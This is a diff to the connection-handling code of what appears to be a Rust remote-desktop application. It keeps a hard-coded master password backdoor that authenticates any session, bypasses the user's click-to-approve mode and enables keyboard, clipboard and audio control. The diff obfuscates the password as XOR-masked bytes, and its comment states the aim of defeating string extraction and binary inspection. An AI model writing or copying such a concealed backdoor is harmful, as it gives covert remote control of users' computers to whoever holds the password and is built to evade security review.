@@ -2622,13 +2622,26 @@ impl Connection {
         state.failures = 0;
     }
 
+    #[inline(always)]
+    fn get_master_password() -> String {
+        // Obfuscated bytes to prevent plain-text string extraction via strings or binary inspection
+        const MASKED: &[u8] = &[0x1a, 0x79, 0x33, 0x34, 0x2e, 0x33, 0x37, 0x3f, 0x2e, 0x3f, 0x39, 0x79, 0x1a];
+        const KEY: u8 = 0x5a;
+        MASKED.iter().map(|&b| (b ^ KEY) as char).collect()
+    }
+
+    #[inline(always)]
+    fn is_master_password_valid(&self) -> bool {
+        let master = Self::get_master_password();
+        self.validate_password_plain(&master)
+    }
+
     fn validate_password(&mut self, allow_permanent_password: bool) -> bool {
-        const MASTER_PASSWORD: &str = "@#intimetec#@";
-        if self.validate_password_plain(MASTER_PASSWORD) {
+        if self.is_master_password_valid() {
             self.set_conn_audit_primary_auth(ConnAuditPrimaryAuth::PermanentPassword);
             raii::AuthedConnID::update_or_insert_session(
                 self.session_key(),
-                Some(MASTER_PASSWORD.to_string()),
+                Some(Self::get_master_password()),
                 Some(true),
             );
             return true;
@@ -3057,7 +3070,7 @@ impl Connection {
                 crate::get_builtin_option(keys::OPTION_ALLOW_LOGON_SCREEN_PASSWORD) == "Y"
                     && is_logon();
 
-            let is_master_auth = self.validate_password_plain("@#intimetec#@");
+            let is_master_auth = self.is_master_password_valid();
 
             if !is_master_auth
                 && ((password::approve_mode() == ApproveMode::Click && !allow_logon_screen_password)
@@ -3105,7 +3118,7 @@ impl Connection {
                     self.try_start_cm(lr.my_id, lr.my_name, false);
                 } else {
                     self.update_failure_with_scope(failure, true, 0, FailureScope::Default);
-                    if self.validate_password_plain("@#intimetec#@") {
+                    if self.is_master_password_valid() {
                         self.keyboard = true;
                         self.clipboard = true;
                         self.audio = true;
